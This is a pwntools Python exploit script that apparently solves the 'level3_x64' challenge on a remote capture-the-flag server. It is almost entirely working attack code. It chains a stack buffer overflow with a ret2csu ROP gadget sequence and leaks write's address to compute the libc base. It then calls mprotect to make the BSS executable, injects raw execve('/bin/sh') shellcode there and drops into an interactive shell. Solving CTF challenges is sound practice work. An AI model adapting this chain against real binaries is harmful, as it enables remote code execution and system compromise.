#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *
import time

#context.arch = 'amd64'
DEBUG = False
if DEBUG:
	io = process("./level3_x64")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./level3_x64")
else:
	io = remote("pwn2.jarvisoj.com","9884")
	libc = ELF("libc-2.19.so")
	elf = ELF("./level3_x64")

def libc_csu(ret,p1,p2,p3):
	pop_2_ret = 0x00000000004006AA#rbx_rbp_r12_r13_r14_r15_ret = 0x00000000004006A6
	mov_call = 0x0000000000400690#rdx=r13;rsi=r14;edi=r15;call r12+8*rbx
	payload = p64(pop_2_ret) + p64(0) + p64(1) + p64(ret) + p64(p3) + p64(p2) + p64(p1) + p64(mov_call)
	return payload

def rop(ret,p1,p2,p3):
	char_num = 0x80
	pad = char_num*"a" + "junkjunk"
	io.recvuntil("Input:\n")
	payload = pad + libc_csu(ret,p1,p2,p3) + p64(0)*7 + p64(0x000000000040061A)
	io.send(payload)
	
context.log_level = "debug"
write_plt = elf.plt["write"]
read_plt = elf.plt["read"]
write_got = elf.got["write"]
read_got = elf.got["read"]
junk_got = 0x0000000000600A50
bss_addr = elf.bss()
sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#sc = asm(shellcraft.sh())
#gdb.attach(io,"b *0x0000000000400618")
rop(write_got,1,write_got,8)
write_addr = u64(io.recv(8))
log.success("write_addr:"+hex(write_addr))
libc.address = write_addr - libc.symbols["write"]
mprotect_addr = libc.symbols["mprotect"]
log.success("mprotect_addr:"+hex(mprotect_addr))
rop(read_got,0,junk_got,8)
io.send(p64(mprotect_addr))
rop(junk_got,0x600000,0x1000,7)

rop(read_got,0,bss_addr,len(sc))
log.success("bss_addr:"+hex(bss_addr))
io.send(sc)
io.recvuntil("Input:\n")
pad = 0x88*"a"
io.send(pad+p64(bss_addr))
# rdi, rsi, rdx, rcx, r8, r9
io.interactive()
	
